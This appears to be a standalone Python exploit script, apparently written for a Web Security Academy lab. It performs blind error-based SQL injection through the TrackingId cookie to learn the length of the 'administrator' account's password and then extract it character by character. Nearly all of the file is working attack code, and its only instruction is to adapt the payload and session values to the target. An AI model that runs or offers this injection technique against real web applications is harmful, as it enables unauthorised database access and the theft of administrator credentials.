#!/usr/bin/python3
# -*- coding: utf-8 -*-
import requests
import sys
import string

if len(sys.argv) != 3:
    print('USAGE: blind.py <url> <word to grep>')
    sys.exit(1)

print("Please update the session and also playload based on your needs and the db values")

url = sys.argv[1]
r = requests.get(url)

TrackingId = "TrackingId=" + r.cookies["TrackingId"]
session = "; session=" + r.cookies["session"]
len_found = False
word = sys.argv[2]
#url = \
 #       'https://ac9c1f9b1ea46c358079258a00cb0052.web-security-academy.net/'
count = 1
while (len_found == False):
    ok = "Trying..." + str(count)
    print(ok, end="\r", flush=True)
    pay = "'||(SELECT CASE WHEN LENGTH(password) >"+str(count)+" THEN TO_CHAR(1/0) ELSE '' END FROM Users WHERE Username='administrator')||'"
    ses = TrackingId + pay \
                + session
    headers = {'Cookie': ses}
    #print('try 0')
    #print(ses)
    r = requests.get(url, headers=headers)

    if word not in r.text:
        #print('we are here')
        len_found = True
    count += 1


pay = \
    "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='administrator')"
l = count
passs = ''
for y in range(1, l):
    pay = ("'||(SELECT CASE WHEN ASCII(SUBSTR(password,1,1)) < "+ str(y)+" THEN TO_CHAR(1/0) ELSE '' END FROM Users WHERE Username = 'administrator')||'")
    found = False
    inti = 48
    fina = 122
    i = 48
    j = 122
    total = 74
    while found == False:
        re = "Retriving.." + passs
        print(re, end="\r", flush=True)
        #print ('i={0},j={1},current={2}'.format(i, j, inti + int((max(i,j) - min(i, j)) / 2)))
        current = inti + int((max(i, j) - min(i, j)) / 2)
        #print('int={0},chr={1}'.format(current, chr(current)))
        test = "'||(SELECT CASE WHEN ASCII(SUBSTR(password,"+str(y)+",1)) ="+str(current)+" THEN TO_CHAR(1/0) ELSE '' END FROM Users WHERE Username = 'administrator')||'"

        #print(test)

        might = False
        t = 0
        if might == False:
            ses = TrackingId + test \
                + session
            headers = {'Cookie': ses}
            #print('try 1')
            #print(ses)
            r = requests.get(url, headers=headers)

            if word in r.text:
                #print('we are here')
                might = True
                found = True
                passs += chr(current)
        if might == False:
            test1 = "'||(SELECT CASE WHEN ASCII(SUBSTR(password,"+str(y)+",1)) < "+str(current)+" THEN TO_CHAR(1/0) ELSE '' END FROM Users WHERE Username = 'administrator')||'"
            ses = TrackingId + test1 \
                + session
            #print('try 2')
            #print(ses)

            headers = {'Cookie': ses}

        r = requests.get(url, headers=headers)
        if word in r.text:
            #print('found')
            t = 1
        else:
            t = 0

        if t == 0:
            i = current
            inti = current
        elif t == 1:
            j = current

print(passs)
